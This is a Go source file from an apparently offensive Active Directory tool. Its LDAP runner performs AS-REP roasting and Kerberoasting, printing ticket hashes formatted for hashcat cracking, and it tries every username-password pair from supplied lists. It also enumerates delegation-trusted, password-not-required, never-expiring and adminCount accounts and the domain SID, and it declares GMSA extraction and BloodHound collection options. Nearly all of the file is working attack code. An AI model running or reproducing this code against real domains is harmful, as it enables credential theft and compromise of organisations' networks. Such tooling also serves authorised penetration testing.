package runner

import (
	"fmt"
	"strings"
	"sync"

	"github.com/5amu/goad/pkg/kerberos"
	"github.com/5amu/goad/pkg/ldap"
	"github.com/5amu/goad/pkg/utils"
)

const (
	ldapKerberoastableFilter   = "(&(objectCategory=person)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(servicePrincipalName=*))"
	trustedForDelegationFilter = "(&(objectCategory=person)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(userAccountControl:1.2.840.113556.1.4.803:=524288))"
	passwordNotRequiredFilter  = "(&(objectCategory=person)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(userAccountControl:1.2.840.113556.1.4.803:=32))"
	passwordNeverExpiresFilter = "(&(objectCategory=person)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(userAccountControl:1.2.840.113556.1.4.803:=65536))"
	adminCountFilter           = "(&(objectCategory=person)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(adminCount=1))"
	enumerationUserFilter      = "(&(objectCategory=person)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
	enumerationGroupsFilter    = "(&(objectCategory=group))"
	getDomainSIDFilter         = "(userAccountControl:1.2.840.113556.1.4.803:=8192)"
)

type LdapOptions struct {
	Targets              struct{ TARGETS []string } `group:"Connection Options" positional-args:"yes" description:"Provide target IP/FQDN/FILE"`
	Username             string                     `group:"Connection Options" short:"u" description:"Provide username (or FILE)"`
	Password             string                     `group:"Connection Options" short:"p" description:"Provide password (or FILE)"`
	Domain               string                     `group:"Connection Options" short:"d" long:"domain" description:"Provide domain"`
	Port                 int                        `group:"Connection Options" long:"port" default:"389" description:"Ldap port to contact"`
	SSL                  bool                       `group:"Connection Options" short:"s" long:"ssl" description:"Use ssl to interact with ldap"`
	UseTLS               bool                       `group:"Connection Options" long:"tls" description:"Upgrade the ldap connection"`
	AsrepRoast           string                     `group:"Hash Retrieval Options" long:"asreproast" description:"Grab AS_REP ticket(s) parsed to be cracked with hashcat"`
	Kerberoast           string                     `group:"Hash Retrieval Options" long:"kerberoast" description:"Grab TGS ticket(s) parsed to be cracked with hashcat"`
	TrustedForDelegation bool                       `group:"Enumeration Options" long:"trusted-for-delegation" description:"Get the list of users and computers with flag TRUSTED_FOR_DELEGATION"`
	PasswordNotRequired  bool                       `group:"Enumeration Options" long:"password-not-required" description:"Get the list of users with flag PASSWD_NOTREQD"`
	PasswordNeverExpires bool                       `group:"Enumeration Options" long:"password-never-expires" description:"Get the list of accounts with flag DONT_EXPIRE_PASSWD"`
	AdminCount           bool                       `group:"Enumeration Options" long:"admin-count" description:"Get objets that had the value adminCount=1"`
	UsersEnum            bool                       `group:"Enumeration Options" long:"users" description:"Enumerate enabled domain users"`
	GroupsEnum           bool                       `group:"Enumeration Options" long:"groups" description:"Enumerate domain groups"`
	DCList               bool                       `group:"Enumeration Options" long:"dc-list" description:"Enumerate Domain Controllers"`
	GetSID               bool                       `group:"Enumeration Options" long:"get-sid" description:"Get domain sid"`
	GMSA                 bool                       `group:"Play with GMSA" long:"gmsa" description:"Enumerate GMSA passwords"`
	GMSAConvertID        string                     `group:"Play with GMSA" long:"gmsa-convert-id" description:"Get the secret name of specific gmsa or all gmsa if no gmsa provided"`
	GMSADecryptLSA       string                     `group:"Play with GMSA" long:"gmsa-decrypt-lsa" description:"Decrypt the gmsa encrypted value from LSA"`
	Bloodhound           string                     `group:"Run Bloodhound Collector v4.2" long:"bloodhound" description:"Run bloodhound collector (v4.2) and save in output file (zip)"`
	BloodhoundNameserver string                     `group:"Run Bloodhound Collector v4.2" short:"n" long:"nameserver" description:"Provide a nameserver for bloodhound collector"`
	Collection           []string                   `group:"Run Bloodhound Collector v4.2" short:"c" long:"collection" default:"Default" description:"Which information to collect. Supported: Group, LocalAdmin, Session, Trusts, Default, DCOnly, DCOM, RDP, PSRemote, LoggedOn, Container, ObjectProps, ACL, All"`

	targets   []string
	usernames []string
	passwords []string
}

func (o *LdapOptions) Run() (err error) {

	o.usernames, err = utils.ReadLines(o.Username)
	if err != nil {
		o.usernames = []string{o.Username}
	}
	o.passwords, err = utils.ReadLines(o.Password)
	if err != nil {
		o.passwords = []string{o.Password}
	}
	for _, t := range o.Targets.TARGETS {
		lines, err := utils.ReadLines(t)
		if err != nil {
			o.targets = append(o.targets, t)
		} else {
			o.targets = append(o.targets, lines...)
		}
	}

	var f func(string) error

	if o.AsrepRoast != "" {
		f = o.asreproast
	} else if o.Kerberoast != "" {
		f = o.kerberoast
	} else if o.TrustedForDelegation {
		f = o.trustedForDelegation
	} else if o.PasswordNotRequired {
		f = o.passwordNotRequired
	} else if o.UsersEnum {
		f = o.userenum
	} else if o.GroupsEnum {
		f = o.groupenum
	} else if o.PasswordNeverExpires {
		f = o.passwordNeverExpires
	} else if o.GetSID {
		f = o.domainSID
	} else if o.AdminCount {
		f = o.adminCount
	} else {
		return fmt.Errorf("nothing to do")
	}

	var wg sync.WaitGroup
	for _, target := range o.targets {
		wg.Add(1)
		go func(t string) {
			if err := f(t); err != nil {
				fmt.Println(err)
			}
			wg.Done()
		}(target)
	}
	wg.Wait()
	return nil
}

func (o *LdapOptions) asreproast(target string) error {
	var res []string
	for _, user := range o.usernames {
		client, err := kerberos.NewKerberosClient(o.Domain, target)
		if err != nil {
			return err
		}
		asrep, err := client.GetAsReqTgt(user)
		if err == nil {
			hash := utils.ASREPToHashcat(*asrep.Ticket)
			fmt.Printf("[+] ASREP-Roastable user %s\\%s... happy cracking!\n\n%s\n\n", o.Domain, user, hash)
			res = append(res, hash)
		}
	}

	if len(res) == 0 {
		return fmt.Errorf("[%s] no asrep-roastable user found on target", target)
	}
	return utils.WriteLines(res, o.AsrepRoast)
}

func (o *LdapOptions) kerberoast(target string) error {
	basedn := fmt.Sprintf("dc=%s", strings.Join(strings.Split(o.Domain, "."), ",dc="))
	ldapClient := &ldap.LdapClient{
		Host:    target,
		Realm:   o.Domain,
		Port:    o.Port,
		BaseDN:  basedn,
		SkipTLS: !o.UseTLS,
		UseSSL:  o.SSL,
	}

	var res []string
	for _, user := range o.usernames {
		for _, password := range o.passwords {
			if err := ldapClient.Authenticate(user, password); err != nil {
				fmt.Printf("[%s\\%s:%s] %v\n", o.Domain, user, password, err)
				continue
			}

			users, err := ldapClient.Search(ldapKerberoastableFilter, []string{"sAMAccountName", "servicePrincipalName"})
			if err != nil {
				fmt.Println(err)
				continue
			}
			ldapClient.Close()

			krb, err := kerberos.NewKerberosClient(o.Domain, target)
			if err != nil {
				fmt.Println(err)
				continue
			}
			krb.AuthenticateWithPassword(user, password)

			for _, entry := range users.Entries {
				usr := entry.GetAttributeValue("sAMAccountName")
				spn := entry.GetAttributeValue("servicePrincipalName")
				tgs, err := krb.GetServiceTicket(usr, spn)
				if err != nil {
					fmt.Println(err)
					continue
				}
				hash := utils.TGSToHashcat(tgs.Ticket, usr)
				res = append(res, hash)
				fmt.Printf("[+] kerberoasted user %s\\%s for SPN %s... happy cracking!\n\n%s\n\n", o.Domain, user, spn, hash)
			}
		}
	}

	if len(res) == 0 {
		return fmt.Errorf("[%s] no kerberoastable user found on target", target)
	}
	return utils.WriteLines(res, o.Kerberoast)
}

func (o *LdapOptions) trustedForDelegation(target string) error {
	basedn := fmt.Sprintf("dc=%s", strings.Join(strings.Split(o.Domain, "."), ",dc="))
	ldapClient := &ldap.LdapClient{
		Host:    target,
		Realm:   o.Domain,
		Port:    o.Port,
		BaseDN:  basedn,
		SkipTLS: !o.UseTLS,
		UseSSL:  o.SSL,
	}

	for _, user := range o.usernames {
		for _, password := range o.passwords {
			if err := ldapClient.Authenticate(user, password); err != nil {
				fmt.Printf("[%s\\%s:%s] %v\n", o.Domain, user, password, err)
				continue
			}

			users, err := ldapClient.Search(trustedForDelegationFilter, []string{"sAMAccountName"})
			if err != nil {
				fmt.Println(err)
				continue
			}
			ldapClient.Close()

			if len(users.Entries) == 0 {
				return fmt.Errorf("[%s]-[%s\\%s:%s] no user with TRUSTED_FOR_DELEGATION", target, o.Domain, user, password)
			}

			for _, entry := range users.Entries {
				usr := entry.GetAttributeValue("sAMAccountName")
				fmt.Printf("[%s]-[%s\\%s:%s] the user is trusted for delegation %s\\%s\n", target, o.Domain, user, password, o.Domain, usr)
			}
		}
	}
	return nil
}

func (o *LdapOptions) passwordNotRequired(target string) error {
	basedn := fmt.Sprintf("dc=%s", strings.Join(strings.Split(o.Domain, "."), ",dc="))
	ldapClient := &ldap.LdapClient{
		Host:    target,
		Realm:   o.Domain,
		Port:    o.Port,
		BaseDN:  basedn,
		SkipTLS: !o.UseTLS,
		UseSSL:  o.SSL,
	}

	for _, user := range o.usernames {
		for _, password := range o.passwords {
			if err := ldapClient.Authenticate(user, password); err != nil {
				fmt.Printf("[%s\\%s:%s] %v\n", o.Domain, user, password, err)
				continue
			}

			users, err := ldapClient.Search(passwordNotRequiredFilter, []string{"sAMAccountName"})
			if err != nil {
				fmt.Println(err)
				continue
			}
			ldapClient.Close()

			if len(users.Entries) == 0 {
				return fmt.Errorf("no user with PASSWD_NOTREQD")
			}

			for _, entry := range users.Entries {
				usr := entry.GetAttributeValue("sAMAccountName")
				fmt.Printf("[%s]-[%s\\%s:%s] password not required for %s\\%s\n", target, o.Domain, user, password, o.Domain, usr)
			}
		}
	}
	return nil
}

func (o *LdapOptions) passwordNeverExpires(target string) error {
	basedn := fmt.Sprintf("dc=%s", strings.Join(strings.Split(o.Domain, "."), ",dc="))
	ldapClient := &ldap.LdapClient{
		Host:    target,
		Realm:   o.Domain,
		Port:    o.Port,
		BaseDN:  basedn,
		SkipTLS: !o.UseTLS,
		UseSSL:  o.SSL,
	}

	for _, user := range o.usernames {
		for _, password := range o.passwords {
			if err := ldapClient.Authenticate(user, password); err != nil {
				fmt.Printf("[%s\\%s:%s] %v\n", o.Domain, user, password, err)
				continue
			}

			users, err := ldapClient.Search(passwordNeverExpiresFilter, []string{"sAMAccountName"})
			if err != nil {
				fmt.Println(err)
				continue
			}
			ldapClient.Close()

			if len(users.Entries) == 0 {
				return fmt.Errorf("impossible to enumerate users with a never expiring password")
			}

			for _, entry := range users.Entries {
				usr := entry.GetAttributeValue("sAMAccountName")
				fmt.Printf("[%s]-[%s\\%s\\%s] %s\\%s has a never expiring password\n", o.Domain, target, user, password, o.Domain, usr)
			}
		}
	}
	return nil
}

func (o *LdapOptions) adminCount(target string) error {
	basedn := fmt.Sprintf("dc=%s", strings.Join(strings.Split(o.Domain, "."), ",dc="))
	ldapClient := &ldap.LdapClient{
		Host:    target,
		Realm:   o.Domain,
		Port:    o.Port,
		BaseDN:  basedn,
		SkipTLS: !o.UseTLS,
		UseSSL:  o.SSL,
	}

	for _, user := range o.usernames {
		for _, password := range o.passwords {
			if err := ldapClient.Authenticate(user, password); err != nil {
				fmt.Printf("[%s\\%s:%s] %v\n", o.Domain, user, password, err)
				continue
			}

			users, err := ldapClient.Search(adminCountFilter, []string{"sAMAccountName"})
			if err != nil {
				fmt.Println(err)
				continue
			}
			ldapClient.Close()

			if len(users.Entries) == 0 {
				return fmt.Errorf("no user with (adminCount=1)")
			}

			for _, entry := range users.Entries {
				usr := entry.GetAttributeValue("sAMAccountName")
				fmt.Printf("[%s]-[%s\\%s\\%s] %s\\%s has (adminCount=1)\n", o.Domain, target, user, password, o.Domain, usr)
			}
		}
	}
	return nil
}

func (o *LdapOptions) userenum(target string) error {
	basedn := fmt.Sprintf("dc=%s", strings.Join(strings.Split(o.Domain, "."), ",dc="))
	ldapClient := &ldap.LdapClient{
		Host:    target,
		Realm:   o.Domain,
		Port:    o.Port,
		BaseDN:  basedn,
		SkipTLS: !o.UseTLS,
		UseSSL:  o.SSL,
	}

	var found bool
	for _, user := range o.usernames {
		for _, password := range o.passwords {
			if err := ldapClient.Authenticate(user, password); err != nil {
				fmt.Printf("[%s\\%s:%s] %v\n", o.Domain, user, password, err)
				continue
			}

			users, err := ldapClient.Search(enumerationUserFilter, []string{"sAMAccountName"})
			if err != nil {
				fmt.Println(err)
				continue
			}
			ldapClient.Close()

			if len(users.Entries) > 0 {
				found = true
			}

			for _, entry := range users.Entries {
				usr := entry.GetAttributeValue("sAMAccountName")
				fmt.Printf("[%s]-[%s\\%s:%s] found user %s\\%s\n", target, o.Domain, user, password, o.Domain, usr)
			}
		}
	}

	if !found {
		return fmt.Errorf("impossible to enumerate users")
	}
	return nil
}

func (o *LdapOptions) groupenum(target string) error {
	basedn := fmt.Sprintf("dc=%s", strings.Join(strings.Split(o.Domain, "."), ",dc="))
	ldapClient := &ldap.LdapClient{
		Host:    target,
		Realm:   o.Domain,
		Port:    o.Port,
		BaseDN:  basedn,
		SkipTLS: !o.UseTLS,
		UseSSL:  o.SSL,
	}

	var found bool
	for _, user := range o.usernames {
		for _, password := range o.passwords {
			if err := ldapClient.Authenticate(user, password); err != nil {
				fmt.Printf("[%s\\%s:%s] %v\n", o.Domain, user, password, err)
				continue
			}

			users, err := ldapClient.Search(enumerationGroupsFilter, []string{"sAMAccountName"})
			if err != nil {
				fmt.Println(err)
				continue
			}
			ldapClient.Close()

			if len(users.Entries) > 0 {
				found = true
			}

			for _, entry := range users.Entries {
				grp := entry.GetAttributeValue("sAMAccountName")
				fmt.Printf("[%s]-[%s\\%s:%s] found group %s\\%s\n", target, o.Domain, user, password, o.Domain, grp)
			}
		}
	}

	if !found {
		return fmt.Errorf("impossible to enumerate groups")
	}
	return nil
}

func (o *LdapOptions) domainSID(target string) error {
	basedn := fmt.Sprintf("dc=%s", strings.Join(strings.Split(o.Domain, "."), ",dc="))
	ldapClient := &ldap.LdapClient{
		Host:    target,
		Realm:   o.Domain,
		Port:    o.Port,
		BaseDN:  basedn,
		SkipTLS: !o.UseTLS,
		UseSSL:  o.SSL,
	}

	var found bool
	for _, user := range o.usernames {
		for _, password := range o.passwords {
			if err := ldapClient.Authenticate(user, password); err != nil {
				fmt.Printf("[%s\\%s:%s] %v\n", o.Domain, user, password, err)
				continue
			}

			users, err := ldapClient.Search(getDomainSIDFilter, []string{"objectSid"})
			if err != nil {
				fmt.Println(err)
				continue
			}
			ldapClient.Close()

			if len(users.Entries) > 0 {
				found = true
			}

			for _, entry := range users.Entries {
				sid := utils.DecodeSID([]byte(entry.GetAttributeValue("objectSid")))
				fmt.Printf("[%s]-[%s\\%s:%s] domain SID is %v\n", target, o.Domain, user, password, sid.String())
				return nil
			}
		}
	}

	if !found {
		return fmt.Errorf("impossible to get domain SID")
	}
	return nil
}
